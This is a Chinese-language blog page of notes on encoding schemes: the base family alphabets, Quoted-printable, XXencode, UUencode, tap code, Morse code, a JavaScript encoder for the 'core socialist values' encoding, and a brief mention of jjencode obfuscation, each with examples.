<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/ascii.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/ascii-2.png"></p>
<h2 id="1-2-Base家族"><a href="#1-2-Base家族" class="headerlink" title="1.2. Base家族"></a>1.2. Base家族</h2><p>base64 编码是用64（2^6）个字符，对二进制数据进行编码的方式<br>base32 就是用32（2^5）个字符，对二进制数据进行编码的方式<br>base16 就是用16（2^4）个字符，对二进制数据进行编码的方式</p>
<p>这里我们可以清楚的看到，base系列编码之间的不同，在于用于编码的字符数量的多少<br>具体参考<a href="https://en.wikipedia.org/wiki/List_of_numeral_systems">wiki百科</a></p>
<h3 id="1-2-1-base16码表"><a href="#1-2-1-base16码表" class="headerlink" title="1.2.1. base16码表"></a>1.2.1. base16码表</h3><p><code>0123456789ABCDEF</code> Base16使用两个ASCII字符去编码原数据中的一个字节数据，所以Base16不可能用到填充符号<code>=</code></p>
<h3 id="1-2-2-base32码表"><a href="#1-2-2-base32码表" class="headerlink" title="1.2.2. base32码表"></a>1.2.2. base32码表</h3><p><code>ABCDEFGHIJKLMNOPQRSTUVWXYZ234567</code> 另有<code>=</code>符号作为填充</p>
<h3 id="1-2-3-base58码表"><a href="#1-2-3-base58码表" class="headerlink" title="1.2.3. base58码表"></a>1.2.3. base58码表</h3><p><code>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz</code> 相比 Base_64，Base_58 不使用数字 “0”，字母大写”O”，字母大写 “I”，和字母小写 “l”，以及 “+” 和 “&#x2F;“ 符号，比Base64共减少6个字符，故称着Base58</p>
<h3 id="1-2-4-base62码表"><a href="#1-2-4-base62码表" class="headerlink" title="1.2.4. base62码表"></a>1.2.4. base62码表</h3><p><code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789</code> Base62使用了62个字符编码，包括0-9，a-z，A-Z。</p>
<h3 id="1-2-5-base64码表"><a href="#1-2-5-base64码表" class="headerlink" title="1.2.5. base64码表"></a>1.2.5. base64码表</h3><p><code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> 另有<code>=</code>符号作为填充</p>
<h3 id="1-2-6-base91码表"><a href="#1-2-6-base91码表" class="headerlink" title="1.2.6. base91码表"></a>1.2.6. base91码表</h3><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/base.png"></p>
<p>Base91编码是从94个可打印ASCII字符（0x21-0x7E）中，以下三个字符被省略以构建Base91编码表：-（破折号，0x2D）\（反斜杠，0x5C）’（撇号，0x27）</p>
<h2 id="1-3-Quoted-printable-编码"><a href="#1-3-Quoted-printable-编码" class="headerlink" title="1.3. Quoted-printable 编码"></a>1.3. Quoted-printable 编码</h2><p>Quoted-printable或QP encoding，没有规范的中文译名，可译为可打印字符引用编码或使用可打印字符的编码。Quoted-printable是使用可打印的ASCII字符（如字母、数字与“&#x3D;”）表示各种编码格式下的字符，以便能在7-bit数据通路上传输8-bit数据, 或者更一般地说在非8-bit clean媒体上正确处理数据。这被定义为MIME content transfer encoding，用于e-mail。</p>
<p>例子：<code>=E4=BB=8A=E5=B9=B4=E5=85=83=E5=A4=9C=E6=97=B6=EF=BC=8C=E6=9C=88=E4=B8=8E=E7=81=AF=E4=BE=9D=E6=97=A7=E3=80=82</code></p>
<p>特点：由<code>=</code>，大写字母<code>A–F</code>和数字<code>0-9</code>组成，不加密英文和数字</p>
<p><a href="http://www.mxcz.net/tools/QuotedPrintable.aspx">在线加解密</a></p>
<h2 id="1-4-XXencode编码"><a href="#1-4-XXencode编码" class="headerlink" title="1.4. XXencode编码"></a>1.4. XXencode编码</h2><p>表：<code>+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</code></p>
<p>XXencode将输入文本以每三个字节为单位进行编码。如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6bit为单位分为4个组，每个组以十进制来表示所出现的数值只会落在0到63之间。以所对应值的位置字符代替。</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs XXencode">hK3VZPaBjN4KxewfYmCjCl94yohH1jwXxiDPLpfrOneepdQuvjTXEo95UkiiV<br>hcwXbiTjLvffnmeDDkfL2pwf-nwbNoxf6zPXqpxOxqeCggfitivL2gfyrrRD1<br>hkSCmiQPfcODJsgXxiDPLpfrOiP9Ho16oiDN0OLGXfB9IBa7dRAuehOLCivTK<br>hnecoiDPLuOCgkvysxhTdohH8ffrspgP+h95hmfv9yPDqnxOplAfxpfLKivjV<br>dkiHIqX0pjHMnpeuwt84XohH9yPPIouPKhPL2nfjKkxTKhzioygnacOA+<br></code></pre></td></tr></table></figure>

<p>特点：第一位通常表示这一行密文是由多少个字符加密得到的，比如<code>cat</code>加密后是<code>1Mq3o</code>，<code>1</code>在表中的索引值是3，所以可以看做原文由三位字符组成。并且每行最多只能加密<code>45</code>个字符，然后换行，可以参考上面的例子</p>
<p><a href="http://web.chacuo.net/charsetxxencode">在线加解密</a></p>
<h2 id="1-5-UUencode编码"><a href="#1-5-UUencode编码" class="headerlink" title="1.5. UUencode编码"></a>1.5. UUencode编码</h2><p>表：<code>ASCII字符集中可打印字符(32-96)</code></p>
<p>UUencode是一种二进制到文字的编码，最早在unix 邮件系统中使用，全称：Unix-to-Unix encoding，UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs UUencode">M555E;F-O9&amp;7*Q]*[UM:V_KWXUL:UO&lt;[$U]:UQ+&#x27;@PNNCK-?NU.?4VG5N:7@@<br>MT\J\_L^US;/6T,JYT\.CK,BKL\:CNE5N:7@M=&amp;\M56YI&gt;&quot;!E;F-O9&amp;EN9Z.L<br>M555E;F-O9&amp;6]J\KDR.O.Q+&amp;^TM3#O\C]N/;7UKW:SJJUI&lt;Z[O?C0T+&#x27;@PNNC<br>MK,CGN?O7[KKSRJ//PK7$U\K!S\G9T]K(_;CVU]:]VJ.LLKNYN[7$LK^WW=/#<br>MP&gt;.RN&lt;;KH:/(_;CVU]:]VKFRT]`R-+CV0FETHZS2U#8M8FETSJJUI&lt;Z[M];.<br>MJC2X]M?IHZS#O[CVU^G2U,JNO?C6QL&quot;TL&gt;W*OLOYL_;/UK7$U]:]VK7$ROW6<br>MM:&amp;CU&gt;*X]LK]UK76N[OAPN34VC&quot;UO38SUJZ\Y*&amp;CR+NZ\[VKP[^X]LK]O-/)<br>MSS,RHZS+^;+ZR?JUQ+WAN?NXU;K#PN34VD%30TE)U]:W^[ROUM&quot;_R;3RTZ&#x27;7<br>CUK?[HZ@S,BV_U;#7H:TY-2VUU\_?HZFUQ+&gt;VSJ?6KM;0H:,`<br></code></pre></td></tr></table></figure>


<p>特点：与XXencode相似，第一位表示这一行密文是由多少个字符加密得到的。</p>
<p><a href="http://web.chacuo.net/charsetuuencode">在线加解密</a></p>
<h2 id="1-6-敲击码"><a href="#1-6-敲击码" class="headerlink" title="1.6. 敲击码"></a>1.6. 敲击码</h2><p>基于5×5方格波利比奥斯方阵来实现</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/tap%20code.png"></p>
<p>例子：<code>..... ../... ./... ./... ../</code></p>
<p>原文：<code>wllm</code></p>
<p>特点：不超过五个点，两个一组</p>
<h2 id="1-7-莫尔斯电码"><a href="#1-7-莫尔斯电码" class="headerlink" title="1.7. 莫尔斯电码"></a>1.7. 莫尔斯电码</h2><p>摩尔斯电码主要由以下5种它的代码组成：<br>1：点（.）<br>2：划（-）<br>3：每个字符间短的停顿（通常用空格表示停顿）<br>4：每个词之间中等的停顿（通常用 &#x2F; 划分）<br>5：以及句子之间长的停顿</p>
<p>表</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">A</span>  <span class="hljs-string">.</span><span class="hljs-literal">-</span>    <span class="hljs-comment">N</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span>    <span class="hljs-string">.</span>  <span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>  <span class="hljs-literal">+</span>  <span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>    <span class="hljs-comment">1</span>  <span class="hljs-string">.</span><span class="hljs-literal">----</span><br><span class="hljs-comment">B</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>  <span class="hljs-comment">O</span>  <span class="hljs-literal">---</span>   <span class="hljs-string">,</span>  <span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">--</span>  <span class="hljs-comment">_</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>   <span class="hljs-comment">2</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">---</span><br><span class="hljs-comment">C</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>  <span class="hljs-comment">P</span>  <span class="hljs-string">.</span><span class="hljs-literal">--</span><span class="hljs-string">.</span>  <span class="hljs-comment">:</span>  <span class="hljs-literal">---</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>  <span class="hljs-comment">$</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>  <span class="hljs-comment">3</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">--</span><br><span class="hljs-comment">D</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span>   <span class="hljs-comment">Q</span>  <span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>  <span class="hljs-comment">&quot;</span>  <span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>  <span class="hljs-comment">&amp;</span>  <span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>    <span class="hljs-comment">4</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><br><span class="hljs-comment">E</span>  <span class="hljs-string">.</span>     <span class="hljs-comment">R</span>  <span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>   <span class="hljs-comment">&#x27;</span>  <span class="hljs-string">.</span><span class="hljs-literal">----</span><span class="hljs-string">.</span>  <span class="hljs-comment">/</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>    <span class="hljs-comment">5</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><br><span class="hljs-comment">F</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>  <span class="hljs-comment">S</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>   <span class="hljs-comment">!</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">--</span>              <span class="hljs-comment">6</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><br><span class="hljs-comment">G</span>  <span class="hljs-literal">--</span><span class="hljs-string">.</span>   <span class="hljs-comment">T</span>  <span class="hljs-literal">-</span>     <span class="hljs-comment">?</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-string">.</span>              <span class="hljs-comment">7</span>  <span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><br><span class="hljs-comment">H</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>  <span class="hljs-comment">U</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>   <span class="hljs-comment">@</span>  <span class="hljs-string">.</span><span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>              <span class="hljs-comment">8</span>  <span class="hljs-literal">---</span><span class="hljs-string">.</span><span class="hljs-string">.</span><br><span class="hljs-comment">I</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span>    <span class="hljs-comment">V</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>  <span class="hljs-literal">-</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>              <span class="hljs-comment">9</span>  <span class="hljs-literal">----</span><span class="hljs-string">.</span><br><span class="hljs-comment">J</span>  <span class="hljs-string">.</span><span class="hljs-literal">---</span>  <span class="hljs-comment">W</span>  <span class="hljs-string">.</span><span class="hljs-literal">--</span>   <span class="hljs-comment">;</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>              <span class="hljs-comment">0</span>  <span class="hljs-literal">-----</span><br><span class="hljs-comment">K</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>   <span class="hljs-comment">X</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>  <span class="hljs-comment">(</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">--</span><span class="hljs-string">.</span><br><span class="hljs-comment">L</span>  <span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span>  <span class="hljs-comment">Y</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">--</span>  <span class="hljs-comment">)</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><br><span class="hljs-comment">M</span>  <span class="hljs-literal">--</span>    <span class="hljs-comment">Z</span>  <span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-string">.</span>  <span class="hljs-comment">=</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><br></code></pre></td></tr></table></figure>

<p>例子：<code>.../---/...</code></p>
<p>原文：<code>SOS</code></p>
<p><a href="http://tool.bugku.com/mosi/">在线解密</a></p>
<h2 id="1-8-社会主义核心价值观编码"><a href="#1-8-社会主义核心价值观编码" class="headerlink" title="1.8. 社会主义核心价值观编码"></a>1.8. 社会主义核心价值观编码</h2><p>github上的加解密js代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;babel-polyfill&quot;</span>;<br>&#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">assert</span>(<span class="hljs-params">...express</span>)&#123;<br>        <span class="hljs-keyword">const</span> l = express.<span class="hljs-property">length</span>;<br>        <span class="hljs-keyword">const</span> msg = (<span class="hljs-keyword">typeof</span> express[l-<span class="hljs-number">1</span>] === <span class="hljs-string">&#x27;string&#x27;</span>)? express[l-<span class="hljs-number">1</span>]: <span class="hljs-string">&#x27;Assert Error&#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> b <span class="hljs-keyword">of</span> express)&#123;<br>            <span class="hljs-keyword">if</span>(!b)&#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(msg);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">randBin</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt;= <span class="hljs-number">0.5</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> values = <span class="hljs-string">&#x27;富强民主文明和谐自由平等公正法治爱国敬业诚信友善&#x27;</span>;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">str2utf8</span>(<span class="hljs-params">str</span>)&#123;<br>        <span class="hljs-comment">// return in hex</span><br><br>        <span class="hljs-keyword">const</span> notEncoded = <span class="hljs-regexp">/[A-Za-z0-9\-\_\.\!\~\*\&#x27;\(\)]/g</span>;<br>        <span class="hljs-keyword">const</span> str1 = str.<span class="hljs-title function_">replace</span>(notEncoded, <span class="hljs-function"><span class="hljs-params">c</span>=&gt;</span>c.<span class="hljs-title function_">codePointAt</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>        <span class="hljs-keyword">let</span> str2 = <span class="hljs-built_in">encodeURIComponent</span>(str1);<br>        <span class="hljs-keyword">const</span> concated = str2.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/%/g</span>, <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">toUpperCase</span>();<br>        <span class="hljs-keyword">return</span> concated;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">utf82str</span>(<span class="hljs-params">utfs</span>)&#123;<br>        <span class="hljs-title function_">assert</span>(<span class="hljs-keyword">typeof</span> utfs === <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;utfs Error&#x27;</span>);<br><br>        <span class="hljs-keyword">const</span> l = utfs.<span class="hljs-property">length</span>;<br><br>        <span class="hljs-title function_">assert</span>((l &amp; <span class="hljs-number">1</span>) === <span class="hljs-number">0</span>);<br><br>        <span class="hljs-keyword">const</span> splited = [];<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; l; i++)&#123;<br>            <span class="hljs-keyword">if</span>((i &amp; <span class="hljs-number">1</span>) === <span class="hljs-number">0</span>)&#123;<br>                splited.<span class="hljs-title function_">push</span>(<span class="hljs-string">&#x27;%&#x27;</span>);<br>            &#125;<br>            splited.<span class="hljs-title function_">push</span>(utfs[i]);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">decodeURIComponent</span>(splited.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">hex2duo</span>(<span class="hljs-params">hexs</span>)&#123;<br>        <span class="hljs-comment">// duodecimal in array of number</span><br><br>        <span class="hljs-comment">// &#x27;0&#x27;.. &#x27;9&#x27; -&gt; 0.. 9</span><br>        <span class="hljs-comment">// &#x27;A&#x27;.. &#x27;F&#x27; -&gt; 10, c - 10    a2fFlag = 10</span><br>        <span class="hljs-comment">//          or 11, c - 6      a2fFlag = 11</span><br>        <span class="hljs-title function_">assert</span>(<span class="hljs-keyword">typeof</span> hexs === <span class="hljs-string">&#x27;string&#x27;</span>)<br><br>        <span class="hljs-keyword">const</span> duo = [];<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> c <span class="hljs-keyword">of</span> hexs)&#123;<br>            <span class="hljs-keyword">const</span> n = <span class="hljs-title class_">Number</span>.<span class="hljs-built_in">parseInt</span>(c, <span class="hljs-number">16</span>);<br>            <span class="hljs-keyword">if</span>(n &lt; <span class="hljs-number">10</span>)&#123;<br>                duo.<span class="hljs-title function_">push</span>(n);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_">randBin</span>())&#123;<br>                    duo.<span class="hljs-title function_">push</span>(<span class="hljs-number">10</span>);<br>                    duo.<span class="hljs-title function_">push</span>(n - <span class="hljs-number">10</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    duo.<span class="hljs-title function_">push</span>(<span class="hljs-number">11</span>);<br>                    duo.<span class="hljs-title function_">push</span>(n - <span class="hljs-number">6</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> duo;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">duo2hex</span>(<span class="hljs-params">duo</span>)&#123;<br>        <span class="hljs-title function_">assert</span>(duo <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>);<br><br>        <span class="hljs-keyword">const</span> hex = [];<br><br>        <span class="hljs-keyword">const</span> l = duo.<span class="hljs-property">length</span>;<br><br>        <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span>(i &lt; l)&#123;<br>            <span class="hljs-keyword">if</span>(duo[i] &lt; <span class="hljs-number">10</span>)&#123;<br>                hex.<span class="hljs-title function_">push</span>(duo[i]);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">if</span>(duo[i] === <span class="hljs-number">10</span>)&#123;<br>                    i++;<br>                    hex.<span class="hljs-title function_">push</span>(duo[i] + <span class="hljs-number">10</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    i++;<br>                    hex.<span class="hljs-title function_">push</span>(duo[i] + <span class="hljs-number">6</span>);<br>                &#125;<br>            &#125;<br>            i++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> hex.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">v</span>=&gt;</span>v.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toUpperCase</span>()).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">duo2values</span>(<span class="hljs-params">duo</span>)&#123;<br>        <span class="hljs-keyword">return</span> duo.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">d</span>=&gt;</span>values[<span class="hljs-number">2</span>*d]+values[<span class="hljs-number">2</span>*d+<span class="hljs-number">1</span>]).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">valuesDecode</span>(<span class="hljs-params">encoded</span>)&#123;<br>        <span class="hljs-keyword">const</span> duo = [];<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> c <span class="hljs-keyword">of</span> encoded)&#123;<br>            <span class="hljs-keyword">const</span> i = values.<span class="hljs-title function_">indexOf</span>(c);<br>            <span class="hljs-keyword">if</span>(i === -<span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(i &amp; <span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">// i is even</span><br>                duo.<span class="hljs-title function_">push</span>(i &gt;&gt; <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> hexs = <span class="hljs-title function_">duo2hex</span>(duo);<br><br>        <span class="hljs-title function_">assert</span>((hexs.<span class="hljs-property">length</span> &amp; <span class="hljs-number">1</span>) === <span class="hljs-number">0</span>);<br><br>        <span class="hljs-keyword">let</span> str;<br>        <span class="hljs-keyword">try</span>&#123;<br>            str = <span class="hljs-title function_">utf82str</span>(hexs);<br>        &#125;<span class="hljs-keyword">catch</span>(e)&#123;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125;<br>        <span class="hljs-keyword">return</span> str;<br>    &#125;<br><br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">valuesEncode</span>(<span class="hljs-params">str</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">duo2values</span>(<span class="hljs-title function_">hex2duo</span>(<span class="hljs-title function_">str2utf8</span>(str)));<br>    &#125;<br><br>    <span class="hljs-comment">// ------------------</span><br><br>    <span class="hljs-keyword">const</span> decodedArea = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;decoded-area&#x27;</span>);<br>    <span class="hljs-keyword">const</span> encodedArea = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;encoded-area&#x27;</span>);<br>    <span class="hljs-keyword">const</span> decodeBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;decode-btn&#x27;</span>);<br>    <span class="hljs-keyword">const</span> encodeBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;encode-btn&#x27;</span>);<br><br>    encodeBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function"><span class="hljs-params">e</span>=&gt;</span>&#123;<br>        encodedArea.<span class="hljs-property">value</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">const</span> encoded = <span class="hljs-title function_">valuesEncode</span>(decodedArea.<span class="hljs-property">value</span>);<br>        encodedArea.<span class="hljs-property">value</span> = encoded;<br>    &#125;);<br><br>    decodeBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function"><span class="hljs-params">e</span>=&gt;</span>&#123;<br>        decodedArea.<span class="hljs-property">value</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">const</span> decoded = <span class="hljs-title function_">valuesDecode</span>(encodedArea.<span class="hljs-property">value</span>);<br>        decodedArea.<span class="hljs-property">value</span> = decoded;<br>    &#125;);<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>分析后不难发现有以下几点结论：</p>
<p>1：表是<code>富强 民主 文明 和谐 自由 平等 公正 法治 爱国 敬业 诚信 友善</code>，索引值<code>0-11</code></p>
<p>2：字符串hex值中的0-9 对应 表索引值的0-9。比如十六进制的0，在表中是<code>富强</code></p>
<p>3：字符串hex值中的A-F 对应 表索引值的关系有两种</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span> -&gt; <span class="hljs-number">10</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">B</span> -&gt; <span class="hljs-number">10</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">C</span> -&gt; <span class="hljs-number">10</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">D</span> -&gt; <span class="hljs-number">10</span> <span class="hljs-number">3</span><br><span class="hljs-attribute">E</span> -&gt; <span class="hljs-number">10</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">F</span> -&gt; <span class="hljs-number">10</span> <span class="hljs-number">5</span><br><br><span class="hljs-attribute">A</span> -&gt; <span class="hljs-number">11</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">B</span> -&gt; <span class="hljs-number">11</span> <span class="hljs-number">5</span><br><span class="hljs-attribute">C</span> -&gt; <span class="hljs-number">11</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">D</span> -&gt; <span class="hljs-number">11</span> <span class="hljs-number">7</span><br><span class="hljs-attribute">E</span> -&gt; <span class="hljs-number">11</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">F</span> -&gt; <span class="hljs-number">11</span> <span class="hljs-number">9</span><br></code></pre></td></tr></table></figure>



<p>解释一下上面的结论，以<code>我Kc !6</code>为例子<br>加密后的几种结果为<br><code>诚信自由公正爱国爱国敬业民主自由诚信民主公正和谐文明富强文明民主和谐公正</code><br><code>诚信自由公正爱国爱国敬业民主自由友善平等公正和谐文明富强文明民主和谐公正</code><br><code>友善爱国公正爱国爱国敬业民主自由诚信民主公正和谐文明富强文明民主和谐公正</code><br><code>友善爱国公正爱国爱国敬业民主自由友善平等公正和谐文明富强文明民主和谐公正</code></p>
<p>先将<code>我Kc !6</code>以十六进制编码的形式表示<code>E6 88 91 4B 63 20 21 36</code></p>
<p><code>E</code>在表中是<code>10 4</code>或者<code>11 8</code>，然后拿<code>10 4</code>和<code>11 8</code>在索引表中找到<code>诚信 自由</code>或者<code>友善 爱国</code>，再接着是<code>6</code>，在表中是<code>公正</code>，后面的以此类推。</p>
<h2 id="1-9-jjencode-x2F-aaencode"><a href="#1-9-jjencode-x2F-aaencode" class="headerlink" title="1.9. jjencode&#x2F;aaencode"></a>1.9. jjencode&#x2F;aaencode</h2><p>jjencode代码，就是将正常的js代码转换成复杂的只有符号的字符串编码，进行加密 如：<code>[$._$_]+$._$+&quot;,\\&quot;+$.$__+$.___+&quot;\\&quot;+$.__$+$.__$+$</code>这样的组合</p>
